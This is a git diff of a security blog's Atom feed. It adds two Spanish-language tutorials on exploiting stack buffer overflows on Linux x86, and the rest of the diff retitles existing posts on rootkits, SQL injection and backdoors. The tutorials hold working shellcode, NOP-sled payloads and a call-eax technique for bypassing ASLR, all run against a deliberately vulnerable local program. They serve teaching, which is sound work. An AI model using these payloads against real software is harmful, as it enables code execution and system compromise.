@@ -4,7 +4,7 @@
   <title><![CDATA[Security]]></title>
   <link href="http://q3rv0.github.io/atom.xml" rel="self"/>
   <link href="http://q3rv0.github.io/"/>
-  <updated>2014-11-23T04:16:19+06:30</updated>
+  <updated>2014-11-24T22:48:31+06:30</updated>
   <id>http://q3rv0.github.io/</id>
   <author>
     <name><![CDATA[q3rv0]]></name>
@@ -14,7 +14,272 @@
 
   
   <entry>
-    <title type="html"><![CDATA[Desbordando El Buffer en Linux X86 (I)]]></title>
+    <title type="html"><![CDATA[Desbordando el buffer en linux x86 (III) [ASLR bypass]]]></title>
+    <link href="http://q3rv0.github.io/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-iii-aslr-bypass/"/>
+    <updated>2014-11-24T21:47:55+06:30</updated>
+    <id>http://q3rv0.github.io/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-iii-aslr-bypass</id>
+    <content type="html"><![CDATA[<p>Esta es la tercera  parte de una serie de tutoriales para aprender a explotar el buffer en sistemas Linux x86. En el anterior apartado se logro encastrar codigo ejecutable y obtener una shell, pero para lograrlo debimos desactivar previamente ASLR.  Como explique anteriormente este sistema de seguridad nos dificulta un<!--more--> poco las cosas randomizando la memoria.</p>
+
+<p>Compilaremos el siguiente codigo que sera usado durante la realizacion de este tutorial.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">funcion_vulnerable</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">input</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1000</span><span class="p">];</span>
+</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="n">funcion_vulnerable</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Verificamos que ASLR se encuentra activo.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>cat /proc/sys/kernel/randomize_va_space
+</span><span class='line'>2
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>De otra manera lo activaremos.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">echo </span><span class="m">2</span> &gt; /proc/sys/kernel/randomize_va_space
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ahora simplemente realizaremos los pasos descriptos en los anteriores capitulos.</p>
+
+<p>Compilamos el code.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gcc -o vuln -fno-stack-protector -mpreferred-stack-boundary<span class="o">=</span><span class="m">2</span> -ggdb -z execstack vuln.c
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Presten atencion al flag -z execstack, esto simplemente vuelve ejecutable el stack ya que NX (Non-Exec) es otra proteccion que al igual que ASLR nos va a romper bastante las pelotas denegandonos la ejecucion de un shellcode en la memoria.</p>
+
+<p>Pero de todas maneras se puede evadir, tema que se tocara en el proximo tuto.</p>
+
+<p>Buscamos la sobrescritura del EIP.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>r $(python -c 'print "\x41"*1004+"\x42"*4')</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/VsmMcJN.png"></p>
+
+<p>Hasta aca todo muy lindo, pero todavia tenemos que saltarnos ASLR.</p>
+
+<p>Una manera de hacer esto es buscando dentro del binario alguna instruccion de  llamada o salto (CALL/JMP) a algun registro. Por que si nos basamos en seguir el anterior tutorial donde sobrescribiamos el EIP con una direccion dentro de ESP que aputaba a un NOP Sled+Shellcode, simplemente no va a funcar, por el echo de que la memoria va a cambiar en cada ejecucion.</p>
+
+<p>Esto podemos hacerlo con objdump.</p>
+
+<p>Buscaremos la existencia de alguna instruccion CALL</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>objdump -d vuln<span class="p">|</span>grep call
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/WcOw5wZ.png"></p>
+
+<p><img src="http://i.imgur.com/2cbfPTg.png"></p>
+
+<p>Perfecto, objdump nos arroja dos direcciones que llaman al registro EAX.</p>
+
+<p>8048387</p>
+
+<p>804840f</p>
+
+<p>Entonces se nos ocurre que si podemos escribir en EAX nuestro shellcode y pintar el EIP con la direccion CALL lograriamos realmente “pintarle la cara a ASLR”.</p>
+
+<p>Bien, hay una parte del buffer en EAX?</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>x/100x $eax</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/8MiR1WD.png"></p>
+
+<p>Como se aprecia, logramos tocar el comienzo del registro, ahora solamente nos falta generar el payload.</p>
+
+<p>Ahora si nos apoyaremos en  MSF para moldear un Shellcode.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf &gt; msfpayload linux/x86/exec <span class="nv">CMD</span><span class="o">=</span>/bin/bash C
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/b5EaI5R.png"></p>
+
+<p>El unico problema que surge, es que si miramos el shellcode, este contiene “badchars”, como por ejemplo la presencia de nullbytes \x00 que nos van a cortar la cadena.</p>
+
+<p>Asi que le pasamos la salida a msfencode para ofuscar un poco el code.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf &gt; msfpayload linux/x86/exec <span class="nv">CMD</span><span class="o">=</span>/bin/bash R<span class="p">|</span>msfencode -a x86 -e x86/alpha_mixed -b <span class="s1">&#39;x\00\x0d\x0a&#39;</span> -t c
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/Z4R607W.png"></p>
+
+<p>Fijense en el flag -b de msfencode y entre comillas la lista de badchars a evadir.</p>
+
+<p>Ahora tenemos el codigo limpio y listo para agregarlo al payload que quedara de la siguiente manera.</p>
+
+<p>Le restamos la longitud del Shellcode al buffer.</p>
+
+<p>1004-152=852</p>
+
+<p>Menos 400 NOPS que iran antes del EIP, quedando el vector de la siguiente manera</p>
+
+<p>NOPS<em>452+Shellcode(152)+NOPS</em>400+EIP (call eax \x87\x83\x04\x08)</p>
+
+<p>Lanzamos el exploit</p>
+
+<p><img src="http://i.imgur.com/g1TDSom.png"></p>
+
+<p>Logrando esquivar satisfactoriamente ASLR.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Desbordando el buffer en linux x86 (II) [NOP Sled]]]></title>
+    <link href="http://q3rv0.github.io/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-ii-nop-sled/"/>
+    <updated>2014-11-24T21:32:57+06:30</updated>
+    <id>http://q3rv0.github.io/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-ii-nop-sled</id>
+    <content type="html"><![CDATA[<p>En el anterior post se hizo una pequeña introduccion al funcionamiento del stack y a los registros del procesador, ademas se logro modificar el flujo<!--more--> de datos de un programa para que atente a una funcion que no habia sido llamada.</p>
+
+<p>En este nuevo apartado se vera como inyectar un shellcode en la memoria para lograr ejecutar codigo a travez del desbordamiento.</p>
+
+<p>Para el poc se va a utlizar el mismo source que la vez pasada salvo que el buffer aumentara su tamaño a 500 bytes.
+Seguimos lo mismos pasos que en el paper anterior.</p>
+
+<p>Desactivamos ASLR</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">echo </span><span class="m">0</span> &gt; /proc/sys/kernel/randomize_va_space
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>y compilamos</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gcc -ggdb -fno-stack-protector -mpreferred-stack-boundary<span class="o">=</span><span class="m">2</span> -o vuln vuln.c
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Abrimos gdb y arrancamos por pasarle 506 caracteres</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>run $(python -c 'print "\x41"*506')</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/mGWY0Ol.png?1"></p>
+
+<p>Ya vemos como se va llenando el EIP</p>
+
+<p>Agregamos 2 mas y lo terminamos de completar.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>run $(python -c 'print "\x41"*508')</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/R9umyqW.png?1"></p>
+
+<p>Ahora bien hasta aca todo perfecto, ahora tenemos que buscar donde poder incrustar el shellcode.</p>
+
+<p>Un shellcode no es mas que un conjunto de instrucciones en ensamblador programado para una tarea especifica, el shellcode que se vera a continuacion nos dara una sesion sh en el sistema. Como dije anteriormente una vez que pasamos el tamaño limite del buffer, los datos comienzan a escribirse en los demas registros, entonces vamos a ver en que otro lugar se mandaron las A’s, si le echamos una ojeada al registro ESP.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>x/100x $esp</span></code></pre></td></tr></table></div></figure>
+
+
+<p>El anterior comando nos mostrara 100 direcciones dentro de ESP</p>
+
+<p><img src="http://i.imgur.com/vBRo9C0.png?1"></p>
+
+<p>Se puede ver que parte del buffer se ha inyectado al registro, perfect!
+Ahora solamente tenenemos que buscar/generar un shellcode acorde a nuestra arquitectura y OS</p>
+
+<p>Podriamos generarlo con metasploit, pero para este apartado voy a utilizar uno que encontre en shell-storm</p>
+
+<p><a href="http://shell-storm.org/shellcode/files/shellcode-827.php">http://shell-storm.org/shellcode/files/shellcode-827.php</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</span></code></pre></td></tr></table></div></figure>
+
+
+<p>El shellcode tiene un tamaño de 23 bytes por le que le restamos la long al buffer-4 bytes pertenecientes al EIP y lo incluimos dentro del payload</p>
+
+<p>Quedando asi</p>
+
+<p>508 NOPS – 4 bytes (EIP) =504</p>
+
+<p>504 NOPS – 23 bytes (SHELLCODE) = 481 NOPS</p>
+
+<p>Payload= \x90*481+shellcode(23)+EIP(4)</p>
+
+<p>En este punto paso a explicar algo, por que reemplaze \x41 por \x90?</p>
+
+<p>\x90 es un NOP (no operacion), un NOP es una instruccion en ensamblador que simplemente no hace nada y nos servira como puente al shellcode que se escribe despues de esta.</p>
+
+<p>Ahora miremos como quedo el ESP luego de inyectar el payload, para esta ejecucion reemplaze el EIP por \x42=B.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>run $(python -c 'print "\x90"*481+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x42"*4')</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>x/100x $esp</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/M9lIAg0.png?1"></p>
+
+<p>En el recuadro verde vemos como se colaron los NOPS y en el rojo se ve como empieza a filtrarse el shellcode.</p>
+
+<p>Ahora lo unico que tenemos que hacer es indicar en el EIP cualquier direccion de memoria en donde se hayan alojado los NOPS</p>
+
+<p><img src="http://i.imgur.com/ij5uY3D.png?1"></p>
+
+<p>Usaremos esta : 0xbffffc70</p>
+
+<p>La invertimos, inyectamos y esperamos la shell!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>run $(python -c 'print "\x90"*481+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x70\xfc\xff\xbf"')</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/x1vl6vW.png?1"></p>
+
+<p>Hasta el momento se vio como explotar satisfactoriamente el desbordamiento, desactivando previamente ASLR para el proximo se vera una forma de bypassear ese sistema de seguridad. saludos!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Desbordando el buffer en linux x86 (I)]]></title>
     <link href="http://q3rv0.github.io/blog/2014/11/23/desbordando-el-buffer-en-linux-x86-i/"/>
     <updated>2014-11-23T04:01:07+06:30</updated>
     <id>http://q3rv0.github.io/blog/2014/11/23/desbordando-el-buffer-en-linux-x86-i</id>
@@ -209,7 +474,7 @@ Controlando el flujo de ejecucion.</p>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Tomando El Control De Una Camara AXIS – Parte I]]></title>
+    <title type="html"><![CDATA[Tomando el control de una camara AXIS – Parte I]]></title>
     <link href="http://q3rv0.github.io/blog/2014/11/23/tomando-el-control-de-una-camara-axis-parte-i/"/>
     <updated>2014-11-23T03:36:54+06:30</updated>
     <id>http://q3rv0.github.io/blog/2014/11/23/tomando-el-control-de-una-camara-axis-parte-i</id>
@@ -457,7 +722,7 @@ Controlando el flujo de ejecucion.</p>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Escribiendo Un Auxiliar Para MSF]]></title>
+    <title type="html"><![CDATA[Escribiendo un auxiliar para MSF]]></title>
     <link href="http://q3rv0.github.io/blog/2014/11/23/escribiendo-un-auxiliar-para-msf/"/>
     <updated>2014-11-23T03:20:10+06:30</updated>
     <id>http://q3rv0.github.io/blog/2014/11/23/escribiendo-un-auxiliar-para-msf</id>
@@ -1000,7 +1265,7 @@ Controlando el flujo de ejecucion.</p>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[MYSQLI EB Con Extractvalue()]]></title>
+    <title type="html"><![CDATA[MYSQLI EB con extractvalue()]]></title>
     <link href="http://q3rv0.github.io/blog/2014/11/23/mysqli-eb-con-extractvalue/"/>
     <updated>2014-11-23T03:06:05+06:30</updated>
     <id>http://q3rv0.github.io/blog/2014/11/23/mysqli-eb-con-extractvalue</id>
@@ -1082,7 +1347,7 @@ Controlando el flujo de ejecucion.</p>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[LFI+SQLI [Incluyendo Ficheros a Travez De Valores Enteros]]]></title>
+    <title type="html"><![CDATA[LFI+SQLI [Incluyendo ficheros a travez de valores enteros]]]></title>
     <link href="http://q3rv0.github.io/blog/2014/11/23/lfi-plus-sqli-incluyendo-ficheros-a-travez-de-valores-enteros/"/>
     <updated>2014-11-23T02:15:42+06:30</updated>
     <id>http://q3rv0.github.io/blog/2014/11/23/lfi-plus-sqli-incluyendo-ficheros-a-travez-de-valores-enteros</id>
@@ -1130,7 +1395,7 @@ Controlando el flujo de ejecucion.</p>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Mysql UDF Injection [Elevacion De Privilegios]]]></title>
+    <title type="html"><![CDATA[Mysql UDF injection [Elevacion de privilegios]]]></title>
     <link href="http://q3rv0.github.io/blog/2014/11/23/mysql-udf-injection-elevacion-de-privilegios/"/>
     <updated>2014-11-23T01:28:36+06:30</updated>
     <id>http://q3rv0.github.io/blog/2014/11/23/mysql-udf-injection-elevacion-de-privilegios</id>
@@ -1235,7 +1500,7 @@ Hay dos formas de añadir funciones a Mysql y una de ellas es a travez de la int
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[[Windows OS] Evadiendo Las Disable_functions en Php Con COM()]]></title>
+    <title type="html"><![CDATA[[Windows OS] Evadiendo las disable_functions en php con COM()]]></title>
     <link href="http://q3rv0.github.io/blog/2014/11/23/windows-os-evadiendo-las-disable-functions-en-php-con-com/"/>
     <updated>2014-11-23T01:17:59+06:30</updated>
     <id>http://q3rv0.github.io/blog/2014/11/23/windows-os-evadiendo-las-disable-functions-en-php-con-com</id>
@@ -1471,7 +1736,7 @@ Para estas situaciones, podemos hacer uso de la funcion sleep() y la estructura 
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[[KBEAST] Plantando Un Rootkit]]></title>
+    <title type="html"><![CDATA[[KBEAST] Plantando un Rootkit]]></title>
     <link href="http://q3rv0.github.io/blog/2014/11/17/kbeast-plantando-un-rootkit/"/>
     <updated>2014-11-17T10:19:05+06:30</updated>
     <id>http://q3rv0.github.io/blog/2014/11/17/kbeast-plantando-un-rootkit</id>
@@ -1722,7 +1987,7 @@ El fichero de log se guarda en el directorio donde le indicamos que se guarde el
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Remote Code Execution]]></title>
+    <title type="html"><![CDATA[remote code execution]]></title>
     <link href="http://q3rv0.github.io/blog/2014/11/17/remote-code-execution/"/>
     <updated>2014-11-17T10:04:38+06:30</updated>
     <id>http://q3rv0.github.io/blog/2014/11/17/remote-code-execution</id>
@@ -1840,7 +2105,7 @@ El codigo se ejecutaria de la siguiente manera en el script.</p>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Jugando Con .htaccess]]></title>
+    <title type="html"><![CDATA[jugando con .htaccess]]></title>
     <link href="http://q3rv0.github.io/blog/2014/11/17/jugando-con-htaccess/"/>
     <updated>2014-11-17T09:27:30+06:30</updated>
     <id>http://q3rv0.github.io/blog/2014/11/17/jugando-con-htaccess</id>
@@ -1978,7 +2243,7 @@ El codigo se ejecutaria de la siguiente manera en el script.</p>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Tecnicas De Blind Mysql Injection]]></title>
+    <title type="html"><![CDATA[Tecnicas de Blind Mysql Injection]]></title>
     <link href="http://q3rv0.github.io/blog/2014/11/17/tecnicas-de-blind-mysql-injection/"/>
     <updated>2014-11-17T08:41:03+06:30</updated>
     <id>http://q3rv0.github.io/blog/2014/11/17/tecnicas-de-blind-mysql-injection</id>
@@ -1994,7 +2259,7 @@ El codigo se ejecutaria de la siguiente manera en el script.</p>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Resultado Del LAMPSecurity:CTF 6 Challenge]]></title>
+    <title type="html"><![CDATA[Resultado del LAMPSecurity:CTF 6 Challenge]]></title>
     <link href="http://q3rv0.github.io/blog/2014/11/17/resultado-del-lampsecurity-ctf-6-challenge/"/>
     <updated>2014-11-17T08:30:28+06:30</updated>
     <id>http://q3rv0.github.io/blog/2014/11/17/resultado-del-lampsecurity-ctf-6-challenge</id>
@@ -2050,7 +2315,7 @@ Rápidamente me hago con el phpmyadmin</p>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Backdoor via Inyeccion]]></title>
+    <title type="html"><![CDATA[Backdoor via inyeccion]]></title>
     <link href="http://q3rv0.github.io/blog/2014/11/17/backdoor-via-inyeccion/"/>
     <updated>2014-11-17T08:19:41+06:30</updated>
     <id>http://q3rv0.github.io/blog/2014/11/17/backdoor-via-inyeccion</id>
@@ -2069,7 +2334,7 @@ hacemos?</p>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Sqli File Inclusion]]></title>
+    <title type="html"><![CDATA[Sqli file inclusion]]></title>
     <link href="http://q3rv0.github.io/blog/2014/11/17/sqli-file-inclusion/"/>
     <updated>2014-11-17T08:12:34+06:30</updated>
     <id>http://q3rv0.github.io/blog/2014/11/17/sqli-file-inclusion</id>
